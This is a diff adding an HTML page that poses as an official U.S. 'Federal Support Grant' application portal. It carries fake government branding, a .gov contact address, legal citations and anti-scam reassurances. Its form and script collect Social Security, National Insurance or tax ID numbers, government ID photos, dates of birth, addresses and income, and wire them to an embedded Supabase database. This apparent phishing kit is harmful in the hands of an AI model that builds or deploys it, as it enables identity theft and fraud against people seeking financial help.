@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apply | Federal Support Grant — GVN Official Program</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --navy:#0b1f3a;--blue:#1a3a6b;--gold:#c9a84c;--gold-light:#f0c96a;
+  --white:#ffffff;--off:#f7f6f3;--gray:#6b7280;--dark:#0f172a;
+  --red:#b91c1c;--green:#15803d;--border:#e2e8f0;--light-blue:#eff6ff;
+}
+html{scroll-behavior:smooth}
+body{font-family:'DM Sans',sans-serif;color:var(--dark);background:var(--off);overflow-x:hidden}
+.top-banner{background:var(--navy);padding:8px 0;text-align:center}
+.top-banner p{font-size:12px;color:rgba(255,255,255,0.65)}
+.top-banner strong{color:var(--gold)}
+.site-header{background:var(--blue);border-bottom:3px solid var(--gold)}
+.header-inner{max-width:1100px;margin:0 auto;padding:16px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.logo-block{display:flex;align-items:center;gap:14px;text-decoration:none}
+.logo-seal{width:50px;height:50px;border-radius:50%;border:2px solid var(--gold);display:flex;align-items:center;justify-content:center;background:rgba(201,168,76,0.1);flex-shrink:0}
+.logo-text strong{display:block;font-family:'Playfair Display',serif;font-size:18px;font-weight:700;color:var(--white)}
+.logo-text span{font-size:11px;color:rgba(255,255,255,0.55);letter-spacing:1.2px;text-transform:uppercase}
+.header-right{display:flex;align-items:center;gap:16px}
+.header-verify{display:flex;align-items:center;gap:6px;font-size:12px;color:rgba(255,255,255,0.55)}
+.verify-dot{width:7px;height:7px;background:#22c55e;border-radius:50%;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.btn-back{font-size:13px;color:rgba(255,255,255,0.7);text-decoration:none;padding:7px 16px;border:1px solid rgba(255,255,255,0.2);border-radius:4px;transition:all .2s}
+.btn-back:hover{color:var(--white);border-color:rgba(255,255,255,0.5)}
+.breadcrumb{background:var(--navy);padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06)}
+.breadcrumb-inner{max-width:1100px;margin:0 auto;padding:0 28px;font-size:12.5px;color:rgba(255,255,255,0.4);display:flex;align-items:center;gap:8px}
+.breadcrumb a{color:rgba(255,255,255,0.5);text-decoration:none}.breadcrumb a:hover{color:var(--gold)}
+.breadcrumb span{color:var(--gold)}
+.page-hero{background:linear-gradient(135deg,var(--navy) 0%,var(--blue) 100%);padding:48px 28px;text-align:center}
+.page-hero-inner{max-width:720px;margin:0 auto}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;background:rgba(201,168,76,0.12);border:1px solid rgba(201,168,76,0.3);border-radius:3px;padding:6px 16px;margin-bottom:18px}
+.hero-tag span{font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--gold)}
+.page-hero h1{font-family:'Playfair Display',serif;font-size:clamp(26px,4vw,40px);font-weight:700;color:var(--white);margin-bottom:12px;line-height:1.2}
+.page-hero p{font-size:15px;color:rgba(255,255,255,0.65);line-height:1.75;font-weight:300}
+.main-wrap{max-width:1100px;margin:0 auto;padding:40px 28px 72px;display:grid;grid-template-columns:1fr 340px;gap:32px;align-items:start}
+.form-card{background:var(--white);border-radius:10px;border:1px solid var(--border);overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.06)}
+.form-card-header{background:var(--navy);padding:24px 32px;display:flex;align-items:center;justify-content:space-between}
+.form-card-header h2{font-family:'Playfair Display',serif;font-size:20px;color:var(--white);font-weight:700}
+.form-ref{font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:.5px}
+.form-body{padding:32px}
+.notice-box{background:var(--light-blue);border:1px solid #bfdbfe;border-left:4px solid var(--blue);border-radius:4px;padding:14px 18px;margin-bottom:28px;font-size:13.5px;color:#1e40af;line-height:1.6}
+.notice-box strong{display:block;margin-bottom:3px;font-weight:700}
+.form-section{margin-bottom:28px}
+.form-section-title{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--blue);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+.form-section-title::before{content:'';display:block;width:3px;height:14px;background:var(--gold);border-radius:2px}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.form-group{display:flex;flex-direction:column;margin-bottom:16px}
+.form-group label{font-size:13px;font-weight:600;color:var(--navy);margin-bottom:6px;display:flex;align-items:center;gap:4px}
+.req{color:var(--red);font-size:14px}
+.field-hint{font-size:11px;color:var(--gray);margin-top:4px;display:flex;align-items:center;gap:4px}
+.field-hint.valid{color:var(--green)}
+.field-hint.invalid{color:var(--red)}
+.form-group input,
+.form-group select,
+.form-group textarea{padding:11px 14px;border:1.5px solid var(--border);border-radius:5px;font-size:14.5px;font-family:inherit;color:var(--dark);background:var(--white);transition:all .2s;appearance:none}
+.form-group input:focus,
+.form-group select:focus,
+.form-group textarea:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3px rgba(26,58,107,0.1)}
+.form-group input.valid{border-color:var(--green);background:#f0fdf4}
+.form-group input.invalid{border-color:var(--red);background:#fef2f2}
+.form-group textarea{resize:vertical;min-height:110px;line-height:1.6}
+.form-group select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;padding-right:36px;cursor:pointer}
+
+/* MONEY INPUT */
+.money-wrap{position:relative}
+.money-prefix{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:15px;font-weight:700;color:var(--navy);pointer-events:none;z-index:1}
+.money-wrap input{padding-left:28px!important;font-weight:600;font-size:15px;letter-spacing:0.3px}
+.money-wrap input:focus{border-color:var(--blue)}
+
+/* ID FIELD WRAPPER */
+.id-country-badge{display:inline-flex;align-items:center;gap:6px;background:var(--light-blue);border:1px solid #bfdbfe;border-radius:3px;padding:3px 10px;font-size:11px;font-weight:700;color:#1e40af;margin-left:8px;letter-spacing:.5px;transition:all .3s}
+.id-country-badge.uk{background:#f0fdf4;border-color:#86efac;color:#15803d}
+.id-country-badge.de{background:#fef9c3;border-color:#fde047;color:#854d0e}
+.id-country-badge.eu{background:#faf5ff;border-color:#d8b4fe;color:#7c3aed}
+
+/* PHOTO UPLOAD */
+.photo-upload-area{border:2px dashed var(--border);border-radius:8px;padding:28px 20px;text-align:center;cursor:pointer;transition:all .25s;background:var(--off);position:relative}
+.photo-upload-area:hover{border-color:var(--blue);background:var(--light-blue)}
+.photo-upload-area.has-photo{border-color:var(--green);border-style:solid;background:#f0fdf4}
+.photo-icon{font-size:36px;margin-bottom:10px}
+.photo-upload-area h4{font-size:15px;font-weight:600;color:var(--navy);margin-bottom:6px}
+.photo-upload-area p{font-size:13px;color:var(--gray);line-height:1.5}
+.photo-btns{display:flex;gap:10px;justify-content:center;margin-top:14px;flex-wrap:wrap}
+.photo-btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;border-radius:5px;font-size:13px;font-weight:600;cursor:pointer;border:none;font-family:inherit;transition:all .2s}
+.photo-btn.camera{background:var(--blue);color:var(--white)}
+.photo-btn.camera:hover{background:var(--navy)}
+.photo-btn.upload{background:var(--white);color:var(--blue);border:1.5px solid var(--blue)}
+.photo-btn.upload:hover{background:var(--light-blue)}
+.photo-preview{display:none;margin-top:16px;position:relative}
+.photo-preview img{width:100%;max-height:220px;object-fit:cover;border-radius:6px;border:2px solid var(--green);display:block}
+.photo-preview-badge{position:absolute;top:8px;right:8px;background:var(--green);color:var(--white);font-size:11px;font-weight:700;padding:4px 10px;border-radius:3px;letter-spacing:.5px}
+.photo-remove{display:block;margin-top:8px;font-size:12px;color:var(--red);cursor:pointer;text-align:center;font-weight:600}
+.photo-remove:hover{text-decoration:underline}
+#cameraInput,#galleryInput{display:none}
+
+/* CHECKBOX */
+.checkbox-group{display:flex;align-items:flex-start;gap:12px;padding:16px;background:var(--off);border-radius:5px;border:1px solid var(--border);margin-bottom:16px;cursor:pointer}
+.checkbox-group input[type="checkbox"]{width:18px;height:18px;flex-shrink:0;margin-top:2px;accent-color:var(--blue);cursor:pointer}
+.checkbox-group p{font-size:13px;color:var(--gray);line-height:1.6}
+.checkbox-group strong{color:var(--dark)}
+.submit-btn{width:100%;background:var(--blue);color:var(--white);font-size:16px;font-weight:700;padding:16px;border:none;border-radius:5px;cursor:pointer;font-family:inherit;transition:all .25s;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:10px}
+.submit-btn:hover:not(:disabled){background:var(--navy);transform:translateY(-1px)}
+.submit-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:var(--white);border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.success-card{display:none;background:var(--white);border-radius:10px;border:2px solid #86efac;padding:40px 32px;text-align:center;box-shadow:0 8px 32px rgba(21,128,61,0.1)}
+.success-icon{font-size:56px;margin-bottom:16px}
+.success-card h3{font-family:'Playfair Display',serif;font-size:26px;color:var(--green);margin-bottom:10px}
+.success-card p{font-size:15px;color:var(--gray);line-height:1.7;margin-bottom:8px}
+.success-ref{display:inline-block;background:#f0fdf4;border:1px solid #86efac;border-radius:4px;padding:10px 24px;font-size:16px;font-weight:700;color:var(--green);margin:16px 0;letter-spacing:1px}
+.error-box{display:none;background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:14px 18px;margin-top:16px;font-size:13.5px;color:var(--red)}
+.form-disclaimer{font-size:12px;color:var(--gray);text-align:center;margin-top:16px;line-height:1.6;padding:12px;background:var(--off);border-radius:4px;border:1px solid var(--border)}
+.sidebar{display:flex;flex-direction:column;gap:20px;position:sticky;top:24px}
+.side-card{background:var(--white);border-radius:8px;border:1px solid var(--border);overflow:hidden}
+.side-card-header{padding:14px 18px;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;border-bottom:1px solid var(--border)}
+.side-card-header.blue{background:var(--navy);color:var(--gold)}
+.side-card-header.gold{background:var(--gold);color:var(--navy)}
+.side-card-header.red{background:#7f1d1d;color:#fca5a5}
+.side-card-body{padding:18px}
+.side-list{list-style:none;padding:0}
+.side-list li{font-size:13px;color:var(--gray);padding:7px 0;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;gap:8px;line-height:1.5}
+.side-list li:last-child{border-bottom:none}
+.side-list li::before{content:'✓';color:var(--green);font-weight:700;flex-shrink:0;font-size:12px;margin-top:1px}
+.side-list.warn li::before{content:'✗';color:var(--red)}
+.contact-item{font-size:13px;color:var(--gray);padding:7px 0;border-bottom:1px solid var(--border)}
+.contact-item:last-child{border-bottom:none}
+.contact-item strong{display:block;font-size:11px;color:var(--blue);font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-bottom:2px}
+.site-footer{background:var(--dark);padding:28px 0}
+.footer-inner{max-width:1100px;margin:0 auto;padding:0 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.footer-inner p{font-size:12px;color:rgba(255,255,255,0.3)}
+.footer-links{display:flex;gap:20px}
+.footer-links a{font-size:12px;color:rgba(255,255,255,0.3);text-decoration:none}
+.footer-links a:hover{color:rgba(255,255,255,0.6)}
+@media(max-width:860px){.main-wrap{grid-template-columns:1fr}.sidebar{position:static}.form-row{grid-template-columns:1fr}}
+@media(max-width:500px){.form-body{padding:20px}.page-hero{padding:36px 20px}}
+</style>
+</head>
+<body>
+
+<div class="top-banner">
+  <p><strong>Official Portal:</strong> Federal Support Grant · GVN Verified · Program Ref: FSG-2025-001 · Always free to apply</p>
+</div>
+
+<header class="site-header">
+  <div class="header-inner">
+    <a href="../index.html" class="logo-block">
+      <div class="logo-seal">
+        <svg viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="15" cy="15" r="14" stroke="#c9a84c" stroke-width="1.5"/>
+          <path d="M15 4L17 10.5H24L18.5 14.5L20.5 21L15 17L9.5 21L11.5 14.5L6 10.5H13Z" fill="#c9a84c"/>
+        </svg>
+      </div>
+      <div class="logo-text">
+        <strong>Federal Support Grant</strong>
+        <span>GVN · Government Grant Network</span>
+      </div>
+    </a>
+    <div class="header-right">
+      <div class="header-verify"><span class="verify-dot"></span> GVN Secure Portal</div>
+      <a href="../index.html" class="btn-back">← Back to Home</a>
+    </div>
+  </div>
+</header>
+
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="../index.html">Home</a>
+    <span>›</span>
+    <span>Submit Application</span>
+  </div>
+</div>
+
+<div class="page-hero">
+  <div class="page-hero-inner">
+    <div class="hero-tag">
+      <span class="verify-dot"></span>
+      <span>2025 Cycle — Applications Open</span>
+    </div>
+    <h1>Federal Support Grant Application</h1>
+    <p>Complete all required fields accurately. Your application will be reviewed within 30–45 business days. Entirely free of charge at every stage.</p>
+  </div>
+</div>
+
+<div class="main-wrap">
+  <div>
+    <!-- SUCCESS -->
+    <div class="success-card" id="successCard">
+      <div class="success-icon">✅</div>
+      <h3>Application Submitted Successfully</h3>
+      <p>Your Federal Support Grant application has been received and logged in our system.</p>
+      <div class="success-ref" id="successRef">FSG-XXXXXXXX</div>
+      <p><strong>Please save your reference number above.</strong></p>
+      <p style="margin-top:10px;font-size:14px;color:var(--gray)">A confirmation email will be sent shortly. Your application is reviewed within 30–45 business days.</p>
+      <p style="margin-top:12px;font-size:13px;color:#b91c1c;font-weight:500">⚠ Reminder: You will NEVER be asked to pay any fee to process or release your grant.</p>
+    </div>
+
+    <!-- FORM -->
+    <div class="form-card" id="formCard">
+      <div class="form-card-header">
+        <h2>Grant Application Form</h2>
+        <div class="form-ref">FSG-2025-001 · GVN Verified</div>
+      </div>
+      <div class="form-body">
+
+        <div class="notice-box">
+          <strong>🔒 Secure & Encrypted Submission</strong>
+          Protected under the Privacy Act of 1974. 256-bit encryption. Zero fees at every stage — if anyone asks for payment, that is fraud.
+        </div>
+
+        <form id="grantForm" novalidate>
+
+          <!-- PERSONAL INFO -->
+          <div class="form-section">
+            <div class="form-section-title">Personal Information</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>First Name <span class="req">*</span></label>
+                <input type="text" id="firstName" placeholder="Enter first name" required>
+              </div>
+              <div class="form-group">
+                <label>Last Name <span class="req">*</span></label>
+                <input type="text" id="lastName" placeholder="Enter last name" required>
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>Date of Birth <span class="req">*</span></label>
+                <input type="date" id="dob" required>
+              </div>
+              <div class="form-group">
+                <label>Email Address <span class="req">*</span></label>
+                <input type="email" id="email" placeholder="your@email.com" required>
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>Phone Number <span class="req">*</span></label>
+                <input type="tel" id="phone" placeholder="+1 (000) 000-0000" required>
+              </div>
+              <div class="form-group">
+                <label>State / Country <span class="req">*</span></label>
+                <select id="state" required>
+                  <option value="">— Select your location —</option>
+                  <optgroup label="United States">
+                    <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+                    <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+                    <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+                    <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+                    <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+                    <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+                    <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+                    <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+                    <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+                    <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+                    <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+                    <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+                    <option>Wisconsin</option><option>Wyoming</option><option>Washington D.C.</option>
+                  </optgroup>
+                  <optgroup label="International">
+                    <option>United Kingdom</option>
+                    <option>Germany</option>
+                    <option>France</option>
+                    <option>Netherlands</option>
+                    <option>Other EU Country</option>
+                  </optgroup>
+                </select>
+              </div>
+            </div>
+            <div class="form-group">
+              <label>Full Residential Address <span class="req">*</span></label>
+              <input type="text" id="address" placeholder="Street address, City, State, ZIP Code" required>
+            </div>
+
+            <!-- DYNAMIC ID FIELD -->
+            <div class="form-group">
+              <label id="idLabel">
+                National ID Number <span class="req">*</span>
+                <span class="id-country-badge" id="idBadge">Select country first</span>
+              </label>
+              <input type="text" id="nationalId" placeholder="Select your country/state above first" disabled>
+              <div class="field-hint" id="idHint">📍 Your ID format will appear after selecting your location above</div>
+            </div>
+          </div>
+
+          <!-- ID PHOTO -->
+          <div class="form-section">
+            <div class="form-section-title">Government ID — Photo Verification</div>
+            <p style="font-size:13.5px;color:var(--gray);margin-bottom:16px;line-height:1.6">Upload a clear photo of your government-issued ID (passport, driver's license, or national ID card). You can take a live photo with your camera or upload from your gallery.</p>
+
+            <div class="photo-upload-area" id="photoArea">
+              <div id="photoPlaceholder">
+                <div class="photo-icon">🪪</div>
+                <h4>Upload Your Government ID</h4>
+                <p>Take a photo with your camera or upload from your device.<br>Accepted: JPG, PNG, HEIC · Max size: 10MB</p>
+                <div class="photo-btns">
+                  <button type="button" class="photo-btn camera" onclick="document.getElementById('cameraInput').click()">
+                    📷 Take Photo
+                  </button>
+                  <button type="button" class="photo-btn upload" onclick="document.getElementById('galleryInput').click()">
+                    🖼 Choose from Gallery
+                  </button>
+                </div>
+              </div>
+              <div class="photo-preview" id="photoPreview">
+                <img id="photoPreviewImg" src="" alt="ID Preview">
+                <div class="photo-preview-badge">✓ ID Uploaded</div>
+                <span class="photo-remove" onclick="removePhoto()">✕ Remove and re-upload</span>
+              </div>
+            </div>
+
+            <!-- Hidden file inputs -->
+            <input type="file" id="cameraInput" accept="image/*" capture="environment">
+            <input type="file" id="galleryInput" accept="image/*">
+          </div>
+
+          <!-- GRANT DETAILS -->
+          <div class="form-section">
+            <div class="form-section-title">Grant Details</div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>Applicant Type <span class="req">*</span></label>
+                <select id="applicantType" required>
+                  <option value="">— Select type —</option>
+                  <option>Individual / Personal</option>
+                  <option>Small Business</option>
+                  <option>Nonprofit Organization</option>
+                  <option>Educational Institution</option>
+                  <option>Government Entity</option>
+                  <option>Tribal Organization</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label>Grant Category <span class="req">*</span></label>
+                <select id="category" required>
+                  <option value="">— Select category —</option>
+                  <option>Small Business Development</option>
+                  <option>Education &amp; Training</option>
+                  <option>Housing Assistance</option>
+                  <option>Environmental &amp; Agriculture</option>
+                  <option>Healthcare &amp; Community</option>
+                  <option>Technology &amp; Innovation</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label>Requested Amount <span class="req">*</span></label>
+                <div class="money-wrap">
+                  <span class="money-prefix">$</span>
+                  <input type="text" id="amount" placeholder="0" inputmode="numeric" required autocomplete="off">
+                </div>
+                <div class="field-hint" id="amountHint">Enter the amount you are requesting</div>
+              </div>
+              <div class="form-group">
+                <label>Annual Income Range <span class="req">*</span></label>
+                <select id="income" required>
+                  <option value="">— Select range —</option>
+                  <option>Below $25,000</option>
+                  <option>$25,000 – $50,000</option>
+                  <option>$50,000 – $100,000</option>
+                  <option>$100,000 – $250,000</option>
+                  <option>Above $250,000</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-group">
+              <label>Purpose of Grant — How will funds be used? <span class="req">*</span></label>
+              <textarea id="purpose" placeholder="Provide a clear and detailed description of how you intend to use the grant funds. Include your project goals, expected timeline, and measurable outcomes." required></textarea>
+            </div>
+          </div>
+
+          <!-- CERTIFICATION -->
+          <div class="form-section">
+            <div class="form-section-title">Certification & Submission</div>
+            <label class="checkbox-group">
+              <input type="checkbox" id="certify" required>
+              <p>I certify that all information provided is <strong>true, accurate, and complete</strong>. I understand that false information is a federal offense under <strong>18 U.S.C. § 1001</strong>.</p>
+            </label>
+            <label class="checkbox-group">
+              <input type="checkbox" id="noFee">
+              <p>I confirm I have <strong>not been asked to pay any fee</strong>. If anyone requests payment related to this grant, I will report it as fraud immediately.</p>
+            </label>
+          </div>
+
+          <button type="submit" class="submit-btn" id="submitBtn">
+            <span>📋</span>
+            <span id="btnText">Submit Application</span>
+          </button>
+          <div class="error-box" id="errorBox"></div>
+          <div class="form-disclaimer">
+            This application is completely free. No payment will ever be requested at any stage.<br>
+            Program Ref: FSG-2025-001 · GVN · Federal Support Grant
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="side-card">
+      <div class="side-card-header blue">Who May Apply</div>
+      <div class="side-card-body">
+        <ul class="side-list">
+          <li>U.S. citizens & permanent residents, 18+</li>
+          <li>Small businesses with valid EIN</li>
+          <li>Nonprofits with 501(c)(3) status</li>
+          <li>State & local government entities</li>
+          <li>Tribal governments & organizations</li>
+          <li>UK, Germany & participating EU residents</li>
+        </ul>
+      </div>
+    </div>
+    <div class="side-card">
+      <div class="side-card-header gold">What to Prepare</div>
+      <div class="side-card-body">
+        <ul class="side-list">
+          <li>Government-issued photo ID</li>
+          <li>Social Security Number (SSN) — USA</li>
+          <li>EIN for business applicants</li>
+          <li>Proof of address</li>
+          <li>Last 2 years of tax returns</li>
+          <li>Project description / business plan</li>
+        </ul>
+      </div>
+    </div>
+    <div class="side-card">
+      <div class="side-card-header red">⚠ Scam Warning</div>
+      <div class="side-card-body">
+        <ul class="side-list warn">
+          <li>We never charge an application fee</li>
+          <li>We never call you unexpectedly</li>
+          <li>We never ask for gift cards</li>
+          <li>We never use WhatsApp or Facebook</li>
+          <li>We never ask for your bank password</li>
+        </ul>
+      </div>
+    </div>
+    <div class="side-card">
+      <div class="side-card-header blue">Need Help?</div>
+      <div class="side-card-body">
+        <div class="contact-item"><strong>Email</strong>support@federalsupportgrant.gov</div>
+        <div class="contact-item"><strong>Helpline (USA)</strong>1-800-FSG-GRANT</div>
+        <div class="contact-item"><strong>Hours</strong>Mon–Fri, 8:00 AM – 6:00 PM EST</div>
+        <div class="contact-item"><strong>Review Period</strong>30–45 business days</div>
+      </div>
+    </div>
+  </aside>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <p>© 2025 Federal Support Grant · Government Grant Network (GVN) · Program Ref: FSG-2025-001</p>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#scam-section">Scam Alert</a>
+      <a href="https://reportfraud.ftc.gov" target="_blank">Report Fraud</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+const { createClient } = supabase
+const db = createClient(
+  'https://cxjtampdkollasplmzwi.supabase.co',
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN4anRhbXBka29sbGFzcGxtendpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3NjEwNDcsImV4cCI6MjA5NTMzNzA0N30.a56AwkIj0PvSXuPn1teDAjgDLp-Oi-ghieqVXVOibQQ'
+)
+
+// ── 1. COUNTRY-AWARE ID FIELD ──────────────────────────
+const US_STATES = ['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut',
+  'Delaware','Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky',
+  'Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi','Missouri',
+  'Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico','New York',
+  'North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania','Rhode Island',
+  'South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont','Virginia','Washington',
+  'West Virginia','Wisconsin','Wyoming','Washington D.C.']
+
+const ID_CONFIGS = {
+  USA: {
+    label: 'Social Security Number (SSN)',
+    placeholder: 'XXX-XX-XXXX',
+    hint: '🇺🇸 Format: XXX-XX-XXXX · 9 digits total',
+    badge: '🇺🇸 USA · SSN',
+    badgeClass: '',
+    maxlength: 11,
+    format: (v) => {
+      let d = v.replace(/\D/g,'').slice(0,9)
+      if(d.length>5) return d.slice(0,3)+'-'+d.slice(3,5)+'-'+d.slice(5)
+      if(d.length>3) return d.slice(0,3)+'-'+d.slice(3)
+      return d
+    },
+    validate: (v) => /^\d{3}-\d{2}-\d{4}$/.test(v),
+    validMsg: '✓ Valid SSN format',
+    invalidMsg: '✗ Must be XXX-XX-XXXX (9 digits)'
+  },
+  UK: {
+    label: 'National Insurance Number (NI)',
+    placeholder: 'AB 12 34 56 C',
+    hint: '🇬🇧 Format: AB 123456 C · 2 letters + 6 digits + 1 letter',
+    badge: '🇬🇧 UK · NI Number',
+    badgeClass: 'uk',
+    maxlength: 13,
+    format: (v) => {
+      let c = v.replace(/\s/g,'').toUpperCase().slice(0,9)
+      if(c.length>6) return c.slice(0,2)+' '+c.slice(2,4)+' '+c.slice(4,6)+' '+c.slice(6,8)+' '+c.slice(8)
+      if(c.length>4) return c.slice(0,2)+' '+c.slice(2,4)+' '+c.slice(4)
+      if(c.length>2) return c.slice(0,2)+' '+c.slice(2)
+      return c
+    },
+    validate: (v) => /^[A-Z]{2}\s?\d{2}\s?\d{2}\s?\d{2}\s?[A-Z]$/i.test(v.replace(/\s/g,'')+v.slice(-1)),
+    validMsg: '✓ Valid NI Number format',
+    invalidMsg: '✗ Must be AB 12 34 56 C format'
+  },
+  DE: {
+    label: 'Tax Identification Number (Steuer-ID)',
+    placeholder: '12345678901',
+    hint: '🇩🇪 Format: 11-digit Steueridentifikationsnummer',
+    badge: '🇩🇪 Germany · Steuer-ID',
+    badgeClass: 'de',
+    maxlength: 11,
+    format: (v) => v.replace(/\D/g,'').slice(0,11),
+    validate: (v) => /^\d{11}$/.test(v.replace(/\s/g,'')),
+    validMsg: '✓ Valid Steuer-ID format',
+    invalidMsg: '✗ Must be exactly 11 digits'
+  },
+  EU: {
+    label: 'National ID / Tax Number',
+    placeholder: 'Enter your national ID or tax number',
+    hint: '🇪🇺 Enter your government-issued national ID or tax identification number',
+    badge: '🇪🇺 EU · National ID',
+    badgeClass: 'eu',
+    maxlength: 20,
+    format: (v) => v,
+    validate: (v) => v.trim().length >= 6,
+    validMsg: '✓ ID number entered',
+    invalidMsg: '✗ Please enter your national ID number (min 6 characters)'
+  }
+}
+
+let currentIdConfig = null
+
+function getIdConfig(location) {
+  if (!location) return null
+  if (US_STATES.includes(location)) return ID_CONFIGS.USA
+  if (location === 'United Kingdom') return ID_CONFIGS.UK
+  if (location === 'Germany') return ID_CONFIGS.DE
+  if (['France','Netherlands','Other EU Country'].includes(location)) return ID_CONFIGS.EU
+  return null
+}
+
+document.getElementById('state').addEventListener('change', function() {
+  const config = getIdConfig(this.value)
+  const idInput = document.getElementById('nationalId')
+  const idLabel = document.getElementById('idLabel')
+  const idBadge = document.getElementById('idBadge')
+  const idHint  = document.getElementById('idHint')
+
+  if (!config) {
+    idInput.disabled = true
+    idInput.placeholder = 'Select your country/state above first'
+    idBadge.textContent = 'Select country first'
+    idBadge.className = 'id-country-badge'
+    idHint.textContent = '📍 Your ID format will appear after selecting your location'
+    idHint.className = 'field-hint'
+    currentIdConfig = null
+    return
+  }
+
+  currentIdConfig = config
+  idInput.disabled = false
+  idInput.placeholder = config.placeholder
+  idInput.maxLength = config.maxlength
+  idInput.value = ''
+  idBadge.textContent = config.badge
+  idBadge.className = 'id-country-badge ' + config.badgeClass
+  idHint.textContent = config.hint
+  idHint.className = 'field-hint'
+
+  // Update label (keep the required star)
+  document.querySelector('#idLabel').childNodes[0].textContent = config.label + ' '
+})
+
+document.getElementById('nationalId').addEventListener('input', function() {
+  if (!currentIdConfig) return
+  const formatted = currentIdConfig.format(this.value)
+  const cursor = this.selectionStart
+  this.value = formatted
+  // Try to restore cursor position
+  try { this.setSelectionRange(cursor, cursor) } catch(e){}
+
+  const isValid = currentIdConfig.validate(formatted)
+  const hint = document.getElementById('idHint')
+
+  if (formatted.length === 0) {
+    this.className = ''
+    hint.textContent = currentIdConfig.hint
+    hint.className = 'field-hint'
+  } else if (isValid) {
+    this.classList.remove('invalid')
+    this.classList.add('valid')
+    hint.textContent = currentIdConfig.validMsg
+    hint.className = 'field-hint valid'
+  } else {
+    this.classList.remove('valid')
+    this.classList.add('invalid')
+    hint.textContent = currentIdConfig.invalidMsg
+    hint.className = 'field-hint invalid'
+  }
+})
+
+// ── 2. PHOTO CAPTURE ──────────────────────────────────
+let photoBase64 = null
+
+function handlePhotoFile(file) {
+  if (!file) return
+  if (file.size > 10 * 1024 * 1024) {
+    alert('Photo is too large. Please use an image under 10MB.')
+    return
+  }
+  const reader = new FileReader()
+  reader.onload = (e) => {
+    photoBase64 = e.target.result
+    document.getElementById('photoPreviewImg').src = photoBase64
+    document.getElementById('photoPlaceholder').style.display = 'none'
+    document.getElementById('photoPreview').style.display = 'block'
+    document.getElementById('photoArea').classList.add('has-photo')
+  }
+  reader.readAsDataURL(file)
+}
+
